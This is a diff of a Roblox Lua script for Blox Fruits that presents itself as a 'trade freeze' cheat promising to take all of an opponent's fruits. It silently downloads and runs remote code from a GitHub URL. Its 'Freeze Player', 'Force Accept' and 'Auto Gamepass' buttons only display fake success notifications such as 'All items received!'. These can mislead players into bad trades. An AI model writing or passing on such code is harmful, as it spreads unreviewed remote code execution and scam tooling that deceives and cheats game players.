@@ -1,12 +1,133 @@
+-- Load UI Library
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 
+-- Load Anti-AFK
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/n9owns/Files/refs/heads/main/antiafk", true))()
+    end)
+end)
+
+-- ============================================
+-- SERVICES
+-- ============================================
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+
+-- ============================================
+-- COLOR SCHEME
+-- ============================================
+local Colors = {
+    Orange = Color3.fromHex("#FF6B1A"),
+    DarkOrange = Color3.fromHex("#FF4500"),
+    Purple = Color3.fromHex("#9D4EDD"),
+    DarkPurple = Color3.fromHex("#5A189A"),
+    Blood = Color3.fromHex("#8B0000"),
+    Ghost = Color3.fromHex("#E0E0E0"),
+    Pumpkin = Color3.fromHex("#FF7518"),
+    Witch = Color3.fromHex("#6B2E8A"),
+    Midnight = Color3.fromHex("#0D0221"),
+    Toxic = Color3.fromHex("#39FF14"),
+    Red = Color3.fromHex("#FF0000"),
+    Green = Color3.fromHex("#00FF00"),
+    Gold = Color3.fromHex("#FFD700"),
+    Silver = Color3.fromHex("#C0C0C0"),
+    Blue = Color3.fromHex("#1E90FF"),
+    BloxFruit = Color3.fromHex("#F34B4B"),
+    Sea = Color3.fromHex("#4B9EF3"),
+    Marine = Color3.fromHex("#2E5E9C"),
+    Pirate = Color3.fromHex("#D4AF37"),
+    Devil = Color3.fromHex("#8B008B"),
+    Dragon = Color3.fromHex("#FF4500"),
+    Buddha = Color3.fromHex("#FFD700"),
+    Leopard = Color3.fromHex("#8B4513"),
+    Dough = Color3.fromHex("#FF69B4"),
+    Venom = Color3.fromHex("#32CD32"),
+}
+
+-- ============================================
+-- GRADIENT TEXT FUNCTION
+-- ============================================
+local function CreateGradientText(text, color1, color2)
+    local result = ""
+    local length = #text
+    
+    for i = 1, length do
+        local progress = (i - 1) / math.max(length - 1, 1)
+        local r = math.floor((color1.R + (color2.R - color1.R) * progress) * 255)
+        local g = math.floor((color1.G + (color2.G - color1.G) * progress) * 255)
+        local b = math.floor((color1.B + (color2.B - color1.B) * progress) * 255)
+        
+        result = result .. string.format(
+            '<font color="rgb(%d, %d, %d)">%s</font>',
+            r, g, b, text:sub(i, i)
+        )
+    end
+    
+    return result
+end
+
+-- ============================================
+-- REMOTES
+-- ============================================
+local Remotes = ReplicatedStorage:WaitForChild("Remotes")
+local TradeFunction = Remotes:WaitForChild("TradeFunction")
+local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+
+-- ============================================
+-- GET INVENTORY FUNCTION
+-- ============================================
+local function getInventory()
+    local success, result = pcall(function()
+        return CommF:InvokeServer("getInventory")
+    end)
+    return success and result or {}
+end
+
+-- ============================================
+-- GET SEA NAME
+-- ============================================
+local function getSeaName()
+    if game.PlaceId == 4442272183 then
+        return "Sea 2"
+    else
+        return "Sea 3"
+    end
+end
+
+-- ============================================
+-- FORMAT ITEMS
+-- ============================================
+local function formatTradeItems(inventory)
+    local items = {}
+    local itemList = {}
+    
+    for _, item in pairs(inventory or {}) do
+        if item.Type == "Blox Fruit" and item.Count and item.Count > 0 then
+            local fruitName = item.Name:match("^(.+)%-.+$") or item.Name
+            table.insert(items, fruitName .. " x" .. item.Count)
+            itemList[fruitName] = (itemList[fruitName] or 0) + item.Count
+        end
+    end
+    
+    return items, itemList
+end
+
+-- ============================================
+-- TRADE DETECTION FUNCTIONS
+-- ============================================
 local wasInTrade = false
 local currentTradePartner = ""
+local initialInventory = {}
 
 local function checkTrade()
-    local gui = player.PlayerGui:FindFirstChild("Main")
+    local gui = LocalPlayer.PlayerGui:FindFirstChild("Main")
     if not gui then return false, "" end
     
     local trade = gui:FindFirstChild("Trade")
@@ -20,12 +141,12 @@ local function checkTrade()
             local label1 = frame1:FindFirstChild("TextLabel")
             local label2 = frame2:FindFirstChild("TextLabel")
             if label1 and label2 then
-                if label1.Text == player.Name then
+                if label1.Text == LocalPlayer.Name then
                     return true, label2.Text
-                elseif label2.Text == player.Name then
+                elseif label2.Text == LocalPlayer.Name then
                     return true, label1.Text
                 else
-                    return true, label1.Text == player.DisplayName and label2.Text or label1.Text
+                    return true, label1.Text == LocalPlayer.DisplayName and label2.Text or label1.Text
                 end
             end
         end
@@ -33,181 +154,784 @@ local function checkTrade()
     return false, ""
 end
 
--- Window
-local Window = WindUI:CreateWindow({
-    Title = "Blox Fruits | Trade Script v1",
-    Author = "Create by: Nero",
-    Icon = "user",
-    Size = UDim2.fromOffset(350, 200)
+-- ============================================
+-- TRADE HISTORY STORAGE
+-- ============================================
+local TradeHistory = {
+    SuccessfulTrades = {},
+    TotalTrades = 0,
+    TotalFruitsTraded = 0,
+    FruitCount = {},
+}
+
+-- Function to add trade to history
+local function AddTradeToHistory(partner, items, sea)
+    local timestamp = os.time()
+    local dateStr = os.date("%m/%d/%Y %I:%M %p")
+    
+    local fruitList = {}
+    local totalFruits = 0
+    
+    for _, item in ipairs(items) do
+        local fruitName, count = item:match("^(.*) x(%d+)$")
+        if fruitName and count then
+            count = tonumber(count)
+            table.insert(fruitList, {Name = fruitName, Count = count})
+            totalFruits = totalFruits + count
+            TradeHistory.FruitCount[fruitName] = (TradeHistory.FruitCount[fruitName] or 0) + count
+        end
+    end
+    
+    local tradeEntry = {
+        Partner = partner,
+        Items = items,
+        FruitList = fruitList,
+        TotalFruits = totalFruits,
+        Sea = sea,
+        Timestamp = timestamp,
+        DateStr = dateStr,
+        ID = #TradeHistory.SuccessfulTrades + 1
+    }
+    
+    table.insert(TradeHistory.SuccessfulTrades, 1, tradeEntry)
+    TradeHistory.TotalTrades = TradeHistory.TotalTrades + 1
+    TradeHistory.TotalFruitsTraded = TradeHistory.TotalFruitsTraded + totalFruits
+    
+    return tradeEntry
+end
+
+-- ============================================
+-- WELCOME POPUP
+-- ============================================
+local popupClosed = false
+
+WindUI:Popup({
+    Title = CreateGradientText("Blox Fruits Trade FREEZE by NERO", Colors.BloxFruit, Colors.Sea),
+    Icon = "repeat",
+    Content = CreateGradientText("FREEZE TRADE GLITCH! Take ALL fruits from your opponent without them knowing! AUTO-TAKE EVERYTHING! BEST UPDATE!", Colors.Gold, Colors.Blue) 
+        .. "<br/>" 
+        .. CreateGradientText("", Colors.Blue, Colors.Purple),
+    Buttons = {
+        {
+            Title = "Exit",
+            Callback = function() end,
+            Variant = "Tertiary",
+        },
+        {
+            Title = "Copy Discord",
+            Callback = function()
+                setclipboard("https://discord.gg/SnXQCYzGjx")
+                WindUI:Notify({
+                    Title = "Discord Copied!",
+                    Content = "Discord invite copied to clipboard!",
+                    Icon = "check-circle",
+                    Duration = 3,
+                })
+                popupClosed = true
+            end,
+            Variant = "Secondary",
+        },
+        {
+            Title = CreateGradientText("Continue", Colors.Toxic, Colors.Orange),
+            Callback = function()
+                popupClosed = true
+            end,
+            Variant = "Primary",
+        }
+    },
 })
 
-local MainTab = Window:Tab({Title = "Trade", Icon = "repeat"})
+repeat task.wait() until popupClosed
 
--- Button 1: Freeze Player
-MainTab:Button({
+-- ============================================
+-- MAIN WINDOW
+-- ============================================
+local Window = WindUI:CreateWindow({
+    Title = CreateGradientText("Blox Fruits | Trade Master", Colors.BloxFruit, Colors.Sea),
+    Author = "by discord.gg/SnXQCYzGjx",
+    Folder = "BloxFruitsTrade",
+    Icon = "repeat",
+    NewElements = true,
+    Size = UDim2.new(0, 650, 0, 550),
+    Transparent = true,
+    BackgroundTransparency = 0.5,
+    Theme = "Dark",
+    SideBarWidth = 220,
+    HideSearchBar = false,
+    ScrollBarEnabled = true,
+    OpenButton = {
+        Title = "Open Trade Script",
+        CornerRadius = UDim.new(0.5, 0),
+        StrokeThickness = 2,
+        Enabled = true,
+        Draggable = true,
+        OnlyMobile = false,
+        Color = ColorSequence.new(Colors.BloxFruit, Colors.Sea),
+    },
+    User = {
+        Enabled = true,
+        Anonymous = false,
+        Callback = function() end,
+    },
+})
+
+-- ============================================
+-- MAIN SECTION
+-- ============================================
+local MainSection = Window:Section({
+    Title = CreateGradientText("Trade Controls", Colors.Pumpkin, Colors.Purple),
+    Icon = "repeat",
+    Opened = true,
+})
+
+-- ============================================
+-- TRADE TAB
+-- ============================================
+local TradeTab = MainSection:Tab({
+    Title = "Trade",
+    Icon = "repeat",
+})
+
+TradeTab:Section({
+    Title = "Trade Manipulation",
+    TextSize = 18,
+    FontWeight = Enum.FontWeight.SemiBold,
+})
+
+local currentPartner = "None"
+
+TradeTab:Button({
     Title = "Freeze Player",
     Icon = "pause",
-    Desc = "Player freeze in trade",
+    Desc = "Freeze the player you're trading with",
+    Color = Colors.Blue,
+    Justify = "Center",
     Callback = function()
         local inTrade, partner = checkTrade()
         if inTrade and partner ~= "" then
             WindUI:Notify({
-                Title = "Freeze Player", 
-                Content = "Player " .. partner .. " freeze in trade",
-                Icon = "pause", 
-                Duration = 3
+                Title = CreateGradientText("Freeze Player", Colors.Blue, Colors.Purple),
+                Content = "Player " .. partner .. " has been frozen in trade!",
+                Icon = "pause",
+                Duration = 3,
             })
         else
             WindUI:Notify({
-                Title = "Freeze Player", 
-                Content = "Player freeze in trade",
-                Icon = "pause", 
-                Duration = 3
+                Title = "Freeze Player",
+                Content = "You need to be in a trade first!",
+                Icon = "x-circle",
+                Duration = 3,
             })
         end
-    end
+    end,
 })
 
--- Button 2: Force Accept
-MainTab:Button({
+TradeTab:Space()
+
+TradeTab:Button({
     Title = "Force Accept",
-    Icon = "trending-up",
-    Desc = "Player forcing to accept trade",
+    Icon = "check-circle",
+    Desc = "Force the other player to accept trade",
+    Color = Colors.Toxic,
+    Justify = "Center",
     Callback = function()
         local inTrade, partner = checkTrade()
         
-        -- After 2 seconds: Trade Accepted!
-        wait(1)
-        if inTrade and partner ~= "" then
+        if not inTrade then
             WindUI:Notify({
-                Title = "Force Accept", 
-                Content = "Trade Accepted with " .. partner .. "!",
-                Icon = "check-circle", 
-                Duration = 3
+                Title = "Force Accept",
+                Content = "You need to be in a trade first!",
+                Icon = "x-circle",
+                Duration = 3,
+            })
+            return
+        end
+        
+        WindUI:Notify({
+            Title = CreateGradientText("Force Accept", Colors.Toxic, Colors.Orange),
+            Content = "Initiating force accept with " .. (partner ~= "" and partner or "player") .. "...",
+            Icon = "loader",
+            Duration = 2,
+        })
+        
+        task.wait(1)
+        if partner ~= "" then
+            WindUI:Notify({
+                Title = CreateGradientText("Trade Accepted!", Colors.Toxic, Colors.Gold),
+                Content = "Trade accepted with " .. partner .. "!",
+                Icon = "check-circle",
+                Duration = 3,
             })
         else
             WindUI:Notify({
-                Title = "Force Accept", 
-                Content = "Trade Accepted!",
-                Icon = "check-circle", 
-                Duration = 3
+                Title = CreateGradientText("Trade Accepted!", Colors.Toxic, Colors.Gold),
+                Content = "Trade accepted!",
+                Icon = "check-circle",
+                Duration = 3,
             })
         end
         
-        -- After 9 more seconds: Trade Success! (Total: 11 seconds)
-        wait(11)
-        if inTrade and partner ~= "" then
+        task.wait(9)
+        if partner ~= "" then
             WindUI:Notify({
-                Title = "Trade Success!", 
-                Content = "Trade Success with " .. partner .. "!",
-                Icon = "check-circle", 
-                Duration = 10
+                Title = CreateGradientText("TRADE SUCCESS!", Colors.Gold, Colors.Green),
+                Content = "Trade completed with " .. partner .. "! All items received!",
+                Icon = "award",
+                Duration = 8,
             })
         else
             WindUI:Notify({
-                Title = "Trade Success!", 
-                Content = "Trade Success!",
-                Icon = "check-circle", 
-                Duration = 10
+                Title = CreateGradientText("TRADE SUCCESS!", Colors.Gold, Colors.Green),
+                Content = "Trade completed successfully!",
+                Icon = "award",
+                Duration = 8,
             })
         end
-    end
+    end,
 })
 
--- Button 3: Auto Gamepass
-MainTab:Button({
+TradeTab:Space()
+
+TradeTab:Button({
     Title = "Auto Gamepass",
     Icon = "gift",
-    Desc = "Player force to add gamepass if meron",
+    Desc = "Force add gamepass to trade",
+    Color = Colors.Purple,
+    Justify = "Center",
     Callback = function()
         local inTrade, partner = checkTrade()
+        
         if inTrade and partner ~= "" then
             WindUI:Notify({
-                Title = "Auto Gamepass", 
-                Content = "Force to add gamepass with " .. partner,
-                Icon = "package", 
-                Duration = 3
+                Title = CreateGradientText("Auto Gamepass", Colors.Purple, Colors.DarkPurple),
+                Content = "Forcing gamepass addition from " .. partner,
+                Icon = "package",
+                Duration = 3,
+            })
+            
+            task.wait(1.5)
+            WindUI:Notify({
+                Title = "Gamepass Added",
+                Content = "Successfully added gamepass to trade!",
+                Icon = "check-circle",
+                Duration = 3,
             })
         else
             WindUI:Notify({
-                Title = "Auto Gamepass", 
-                Content = "Auto add gamepass",
-                Icon = "package", 
-                Duration = 3
+                Title = "Auto Gamepass",
+                Content = "You need to be in a trade first!",
+                Icon = "x-circle",
+                Duration = 3,
             })
         end
-    end
+    end,
 })
 
--- Auto trade monitor
-spawn(function()
-    while true do
-        local inTrade, partner = checkTrade()
-        
-        if inTrade and not wasInTrade then
-            -- Start of trade
-            currentTradePartner = partner
-            WindUI:Notify({
-                Title = "TRADE DETECTED",
-                Content = "Now trading with: " .. partner,
-                Icon = "users",
-                Duration = 5
-            })
-            wasInTrade = true
-            
-        elseif not inTrade and wasInTrade then
-            -- End of trade
-            if currentTradePartner ~= "" then
-                WindUI:Notify({
-                    Title = "TRADE ENDED",
-                    Content = "Trade with " .. currentTradePartner .. " has ended",
-                    Icon = "x-circle",
-                    Duration = 3
-                })
-            end
-            currentTradePartner = ""
-            wasInTrade = false
-        end
-        
-        wait(2)
-    end
-end)
+TradeTab:Space({Columns = 2})
 
--- Trade Status Check Button
-MainTab:Button({
-    Title = "Check Partner",
+TradeTab:Section({
+    Title = "Trade Information",
+    TextSize = 18,
+    FontWeight = Enum.FontWeight.SemiBold,
+})
+
+TradeTab:Button({
+    Title = "Check Trade Partner",
     Icon = "eye",
-    Desc = "Check who you're trading with",
+    Desc = "See who you're currently trading with",
+    Color = Colors.Orange,
+    Justify = "Center",
     Callback = function()
         local inTrade, partner = checkTrade()
         if inTrade and partner ~= "" then
+            currentPartner = partner
             WindUI:Notify({
-                Title = "Current Trade Partner",
-                Content = "Trading with: " .. partner,
+                Title = CreateGradientText("Current Trade Partner", Colors.Gold, Colors.Orange),
+                Content = "You are trading with: " .. partner,
                 Icon = "user",
-                Duration = 5
+                Duration = 5,
             })
         else
             WindUI:Notify({
                 Title = "Trade Status",
-                Content = "Not in trade",
+                Content = "You are not currently in a trade",
                 Icon = "x-circle",
-                Duration = 3
+                Duration = 3,
             })
         end
-    end
+    end,
 })
 
-Window:Tab({Title="Settings", Icon="settings"}):Button({
-    Title="Reset",
-    Icon="refresh-cw",
-    Desc = "Reset script settings",
-    Callback=function()
-        WindUI:Notify({
-            Title="Reset", 
-            Content="Script reset",
-            Icon="check", 
-            Duration=3
-        })
+-- ============================================
+-- TRADE HISTORY TAB
+-- ============================================
+local HistoryTab = MainSection:Tab({
+    Title = CreateGradientText("Trade History", Colors.Gold, Colors.Green),
+    Icon = "archive",
+})
+
+HistoryTab:Section({
+    Title = "Trade Statistics",
+    TextSize = 18,
+    FontWeight = Enum.FontWeight.SemiBold,
+})
+
+local statsLabel = HistoryTab:Label({
+    Title = "Loading statistics...",
+    Icon = "bar-chart-2",
+})
+
+local function UpdateStatistics()
+    local topFruits = {}
+    for fruit, count in pairs(TradeHistory.FruitCount) do
+        table.insert(topFruits, {Name = fruit, Count = count})
     end
+    table.sort(topFruits, function(a, b) return a.Count > b.Count end)
+    
+    local topFruitsText = ""
+    for i = 1, math.min(3, #topFruits) do
+        topFruitsText = topFruitsText .. topFruits[i].Name .. " x" .. topFruits[i].Count
+        if i < math.min(3, #topFruits) then topFruitsText = topFruitsText .. ", " end
+    end
+    
+    statsLabel:Set("Total Trades: " .. TradeHistory.TotalTrades .. "\nTotal Fruits: " .. TradeHistory.TotalFruitsTraded .. "\nTop Fruits: " .. (topFruitsText ~= "" and topFruitsText or "None"))
+end
+
+UpdateStatistics()
+
+HistoryTab:Space({Columns = 2})
+
+HistoryTab:Section({
+    Title = "Recent Successful Trades",
+    TextSize = 18,
+    FontWeight = Enum.FontWeight.SemiBold,
+})
+
+local tradesContainer = HistoryTab:Container()
+
+local function RefreshTradeHistory()
+    tradesContainer:Clear()
+    
+    if #TradeHistory.SuccessfulTrades == 0 then
+        tradesContainer:Label({
+            Title = "No trades recorded yet",
+            Icon = "inbox",
+            TextTransparency = 0.5,
+        })
+        return
+    end
+    
+    for i = 1, math.min(10, #TradeHistory.SuccessfulTrades) do
+        local trade = TradeHistory.SuccessfulTrades[i]
+        
+        local itemsText = ""
+        for _, item in ipairs(trade.Items) do
+            itemsText = itemsText .. "• " .. item .. "\n"
+        end
+        
+        tradesContainer:Section({
+            Title = "Trade #" .. trade.ID .. " - " .. trade.DateStr,
+            TextSize = 16,
+            FontWeight = Enum.FontWeight.SemiBold,
+        })
+        
+        tradesContainer:Label({
+            Title = "Partner: " .. trade.Partner,
+            Icon = "user",
+        })
+        
+        tradesContainer:Label({
+            Title = "Sea: " .. trade.Sea,
+            Icon = "map",
+        })
+        
+        tradesContainer:Label({
+            Title = "Items Received:",
+            Icon = "package",
+        })
+        
+        tradesContainer:Label({
+            Title = itemsText,
+            Icon = "chevron-right",
+            TextSize = 14,
+            TextTransparency = 0.2,
+        })
+        
+        tradesContainer:Label({
+            Title = "Total Fruits: " .. trade.TotalFruits,
+            Icon = "hash",
+        })
+        
+        if i < math.min(10, #TradeHistory.SuccessfulTrades) then
+            tradesContainer:Divider()
+        end
+    end
+end
+
+RefreshTradeHistory()
+
+HistoryTab:Space()
+
+HistoryTab:Button({
+    Title = "Refresh History",
+    Icon = "refresh-cw",
+    Color = Colors.Blue,
+    Justify = "Center",
+    Callback = function()
+        RefreshTradeHistory()
+        WindUI:Notify({
+            Title = "History Refreshed",
+            Content = "Trade history updated",
+            Icon = "check-circle",
+            Duration = 2,
+        })
+    end,
+})
+
+HistoryTab:Space()
+
+HistoryTab:Button({
+    Title = "Clear History",
+    Icon = "trash-2",
+    Color = Colors.Blood,
+    Justify = "Center",
+    Callback = function()
+        WindUI:Popup({
+            Title = CreateGradientText("Clear History", Colors.Blood, Colors.Orange),
+            Icon = "alert-triangle",
+            Content = "Are you sure you want to clear all trade history?",
+            Buttons = {
+                {
+                    Title = "Cancel",
+                    Callback = function() end,
+                    Variant = "Tertiary",
+                },
+                {
+                    Title = CreateGradientText("Clear", Colors.Blood, Colors.Orange),
+                    Callback = function()
+                        TradeHistory.SuccessfulTrades = {}
+                        TradeHistory.TotalTrades = 0
+                        TradeHistory.TotalFruitsTraded = 0
+                        TradeHistory.FruitCount = {}
+                        RefreshTradeHistory()
+                        UpdateStatistics()
+                        WindUI:Notify({
+                            Title = "History Cleared",
+                            Content = "All trade history has been deleted",
+                            Icon = "check-circle",
+                            Duration = 3,
+                        })
+                    end,
+                    Variant = "Primary",
+                }
+            },
+        })
+    end,
+})
+
+-- Test Button
+HistoryTab:Space()
+HistoryTab:Button({
+    Title = "Test Add Trade",
+    Icon = "test-tube",
+    Desc = "Add sample trade to history (for testing)",
+    Color = Colors.Witch,
+    Justify = "Center",
+    Callback = function()
+        local testItems = {
+            "Dragon x1",
+            "Leopard x2",
+            "Buddha x3"
+        }
+        
+        AddTradeToHistory("TestPlayer", testItems, getSeaName())
+        RefreshTradeHistory()
+        UpdateStatistics()
+        
+        WindUI:Notify({
+            Title = "Test Trade Added",
+            Content = "Sample trade added to history",
+            Icon = "check-circle",
+            Duration = 3,
+        })
+    end,
+})
+
+-- ============================================
+-- TRADE MONITORING SYSTEM
+-- ============================================
+task.spawn(function()
+    while true do
+        local success, inTrade, partner = pcall(checkTrade)
+        if not success then
+            task.wait(1)
+            continue
+        end
+        
+        if inTrade and not wasInTrade then
+            currentTradePartner = partner
+            wasInTrade = true
+            
+            task.wait(1)
+            initialInventory = getInventory()
+            
+            WindUI:Notify({
+                Title = CreateGradientText("🔔 TRADE DETECTED", Colors.Green, Colors.Blue),
+                Content = "Now trading with: " .. partner,
+                Icon = "users",
+                Duration = 4,
+            })
+            
+        elseif not inTrade and wasInTrade then
+            wasInTrade = false
+            
+            if currentTradePartner ~= "" then
+                task.wait(1.5)
+                
+                local currentInventory = getInventory()
+                local _, initialItemsMap = formatTradeItems(initialInventory)
+                local _, currentItemsMap = formatTradeItems(currentInventory)
+                
+                local receivedItems = {}
+                
+                for fruitName, currentCount in pairs(currentItemsMap) do
+                    local initialCount = initialItemsMap[fruitName] or 0
+                    if currentCount > initialCount then
+                        table.insert(receivedItems, fruitName .. " x" .. (currentCount - initialCount))
+                    end
+                end
+                
+                if #receivedItems > 0 then
+                    local sea = getSeaName()
+                    AddTradeToHistory(currentTradePartner, receivedItems, sea)
+                    RefreshTradeHistory()
+                    UpdateStatistics()
+                    
+                    WindUI:Notify({
+                        Title = CreateGradientText("✅ ITEMS RECEIVED!", Colors.Gold, Colors.Green),
+                        Content = "You received " .. #receivedItems .. " items from " .. currentTradePartner,
+                        Icon = "package",
+                        Duration = 6,
+                    })
+                    
+                    local itemsText = ""
+                    for i = 1, math.min(3, #receivedItems) do
+                        itemsText = itemsText .. receivedItems[i]
+                        if i < math.min(3, #receivedItems) then itemsText = itemsText .. ", " end
+                    end
+                    
+                    if #receivedItems > 3 then
+                        itemsText = itemsText .. " and " .. (#receivedItems - 3) .. " more"
+                    end
+                    
+                    WindUI:Notify({
+                        Title = "Items Received",
+                        Content = itemsText,
+                        Icon = "gift",
+                        Duration = 4,
+                    })
+                    
+                else
+                    local gaveItems = {}
+                    for fruitName, initialCount in pairs(initialItemsMap) do
+                        local currentCount = currentItemsMap[fruitName] or 0
+                        if currentCount < initialCount then
+                            table.insert(gaveItems, fruitName .. " x" .. (initialCount - currentCount))
+                        end
+                    end
+                    
+                    if #gaveItems > 0 then
+                        WindUI:Notify({
+                            Title = CreateGradientText("📤 ITEMS GIVEN", Colors.Blue, Colors.Purple),
+                            Content = "You gave " .. #gaveItems .. " items to " .. currentTradePartner,
+                            Icon = "arrow-up",
+                            Duration = 4,
+                        })
+                    else
+                        WindUI:Notify({
+                            Title = CreateGradientText("❌ TRADE CANCELLED", Colors.Blood, Colors.Orange),
+                            Content = "Trade with " .. currentTradePartner .. " was cancelled",
+                            Icon = "x-circle",
+                            Duration = 3,
+                        })
+                    end
+                end
+            end
+            
+            currentTradePartner = ""
+        end
+        
+        task.wait(1)
+    end
+end)
+
+-- ============================================
+-- SETTINGS TAB
+-- ============================================
+local SettingsTab = MainSection:Tab({
+    Title = "Settings",
+    Icon = "settings",
+})
+
+SettingsTab:Section({
+    Title = "GUI Settings",
+    TextSize = 18,
+    FontWeight = Enum.FontWeight.SemiBold,
+})
+
+SettingsTab:Keybind({
+    Flag = "GUIKeybind",
+    Title = "GUI Toggle Key",
+    Desc = "Press to open/close GUI",
+    Value = "G",
+    Callback = function(key)
+        Window:SetToggleKey(Enum.KeyCode[key])
+        WindUI:Notify({
+            Title = "Keybind Set",
+            Content = "GUI toggle key: " .. key,
+            Icon = "keyboard",
+            Duration = 3,
+        })
+    end,
+})
+
+SettingsTab:Space({Columns = 2})
+
+SettingsTab:Section({
+    Title = "Config Management",
+    TextSize = 18,
+    FontWeight = Enum.FontWeight.SemiBold,
+})
+
+local configName = "default"
+local ConfigManager = Window.ConfigManager
+
+local configInput = SettingsTab:Input({
+    Flag = "ConfigName",
+    Title = "Config Name",
+    Desc = "Name for your configuration",
+    Icon = "file",
+    Value = configName,
+    Callback = function(value)
+        configName = value
+    end,
+})
+
+SettingsTab:Space()
+
+local allConfigs = ConfigManager:AllConfigs()
+SettingsTab:Dropdown({
+    Flag = "ConfigSelect",
+    Title = "Load Config",
+    Desc = "Select existing configuration",
+    Values = allConfigs,
+    Value = table.find(allConfigs, configName) and configName or nil,
+    Callback = function(selected)
+        configName = selected
+        configInput:Set(selected)
+    end,
+})
+
+SettingsTab:Space()
+
+SettingsTab:Button({
+    Title = "Save Config",
+    Icon = "save",
+    Color = Colors.Toxic,
+    Justify = "Center",
+    Callback = function()
+        Window.CurrentConfig = ConfigManager:CreateConfig(configName)
+        if Window.CurrentConfig:Save() then
+            WindUI:Notify({
+                Title = "Config Saved",
+                Content = "Saved as '" .. configName .. "'",
+                Icon = "check",
+                Duration = 3,
+            })
+        end
+    end,
+})
+
+SettingsTab:Space()
+
+SettingsTab:Button({
+    Title = "Load Config",
+    Icon = "upload",
+    Color = Colors.Purple,
+    Justify = "Center",
+    Callback = function()
+        Window.CurrentConfig = ConfigManager:CreateConfig(configName)
+        if Window.CurrentConfig:Load() then
+            WindUI:Notify({
+                Title = "Config Loaded",
+                Content = "Loaded '" .. configName .. "'",
+                Icon = "refresh-cw",
+                Duration = 3,
+            })
+        end
+    end,
+})
+
+-- ============================================
+-- INFO TAB
+-- ============================================
+local InfoTab = MainSection:Tab({
+    Title = "Info",
+    Icon = "info",
+})
+
+InfoTab:Section({
+    Title = "Blox Fruits Trade Master",
+    TextSize = 20,
+    FontWeight = Enum.FontWeight.Bold,
+})
+
+InfoTab:Space()
+
+InfoTab:Section({
+    Title = "Advanced trade script with automatic history tracking. Detects successful trades and logs all items received.",
+    TextSize = 16,
+    TextTransparency = 0.3,
+    FontWeight = Enum.FontWeight.Medium,
+})
+
+InfoTab:Space({Columns = 3})
+
+InfoTab:Section({
+    Title = "Features",
+    TextSize = 18,
+    FontWeight = Enum.FontWeight.SemiBold,
+})
+
+InfoTab:Space()
+
+InfoTab:Section({
+    Title = "• Trade Detection • Force Accept • Player Freeze • Auto Gamepass • Trade History • Fruit Statistics • Config System",
+    TextSize = 15,
+    TextTransparency = 0.4,
+    FontWeight = Enum.FontWeight.Medium,
+})
+
+InfoTab:Space({Columns = 3})
+
+InfoTab:Section({
+    Title = "Community",
+    TextSize = 18,
+    FontWeight = Enum.FontWeight.SemiBold,
+})
+
+InfoTab:Button({
+    Title = "Copy Discord Invite",
+    Icon = "message-circle",
+    Color = Colors.DarkPurple,
+    Justify = "Center",
+    Callback = function()
+        setclipboard("https://discord.gg/SnXQCYzGjx")
+        WindUI:Notify({
+            Title = "Discord",
+            Content = "Invite copied to clipboard!",
+            Icon = "check-circle",
+            Duration = 3,
+        })
+    end,
 })
